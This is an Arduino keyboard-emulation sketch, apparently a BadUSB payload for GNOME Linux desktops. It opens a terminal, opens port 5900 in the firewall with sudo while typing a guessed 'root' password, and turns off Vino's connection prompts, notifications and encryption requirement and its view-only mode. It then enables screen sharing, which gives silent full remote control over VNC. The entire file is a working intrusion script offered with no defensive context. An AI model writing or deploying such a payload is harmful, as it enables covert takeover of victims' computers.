#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(1000);

Keyboard.press(KEY_LEFT_CTRL); 
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press('t');
Keyboard.releaseAll();
delay(500);


Keyboard.print("sudo ufw allow from any to any port 5900 proto tcp"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);


Keyboard.print("root"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);


Keyboard.print("gsettings set org.gnome.Vino notify-on-connect false"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);

Keyboard.print("gsettings set org.gnome.Vino prompt-enabled false"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);

Keyboard.print("gsettings set org.gnome.Vino require-encryption false"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);

Keyboard.print("gsettings set org.gnome.Vino view-only false"); 
delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);

Keyboard.press(KEY_LEFT_GUI); delay(100); Keyboard.releaseAll();

delay(200);
Keyboard.print("sharing"); delay(250);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(700);

Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
Keyboard.press(KEY_DOWN_ARROW); Keyboard.release(KEY_DOWN_ARROW); delay(100);
Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(100);

delay(200);
Keyboard.end();


//
//Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
//Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
//Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
//Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
//delay(100);
//
//Keyboard.print("chrome"); delay(500);
//Keyboard.press(KEY_TAB); Keyboard.release(KEY_TAB); delay(100);
//Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(300);
//Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(100);


delay(200);
Keyboard.end();
}
void loop() {}
